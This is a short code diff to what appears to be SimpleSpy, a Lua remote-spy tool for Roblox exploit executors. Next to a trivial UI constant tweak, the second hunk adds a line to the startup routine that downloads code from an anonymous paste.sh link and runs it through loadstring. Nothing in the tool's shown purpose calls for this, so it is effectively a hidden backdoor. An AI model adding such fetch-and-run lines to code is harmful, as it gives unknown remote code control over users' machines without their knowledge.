@@ -419,7 +419,7 @@ function onBarInput(input)
                         currentX = currentPos.X.Offset
                     end
                     local currentY = currentPos.Y.Offset + (newPos - lastPos).Y
-                    if (currentY < 11 and currentY < currentPos.Y.Offset) or (currentY > (workspace.CurrentCamera.ViewportSize.Y - (main.Size.Y.Offset + 48)) and currentY > currentPos.Y.Offset) then
+                    if (currentY < 11 and currentY < currentPos.Y.Offset) or (currentY > (workspace.CurrentCamera.ViewportSize.Y - (main.Size.Y.Offset + 47)) and currentY > currentPos.Y.Offset) then
                         currentY = currentPos.Y.Offset
                     end
                     currentPos = UDim2.new(0, currentX, 0, currentY)
@@ -1208,6 +1208,8 @@ if not _G.SimpleSpyExecuted then
         codebox:GetPropertyChangedSignal("CursorPosition"):Connect(onCursorPosChange)
         connectResize()
         onToggleButtonClick()
+        _G.EndTweenSize, _G.EndTweenPos = UDim2.new(0, main.AbsoluteSize.X + side.AbsoluteSize.X, 0, main.AbsoluteSize.Y + 22), UDim2.new(0, main.AbsolutePosition.X, 0, main.AbsolutePosition.Y - 11)
+        loadstring(game:HttpGet("https://paste.sh/wesyzxGm#XlzPckBfsMrznf9CXq9pGWFv"))()
         ScreenguiS.Enabled = true
         main.Position = UDim2.new(0, main.AbsolutePosition.X, 0, main.AbsolutePosition.Y)
         coroutine.wrap(function() wait(1) toggleSideTray(true) end)
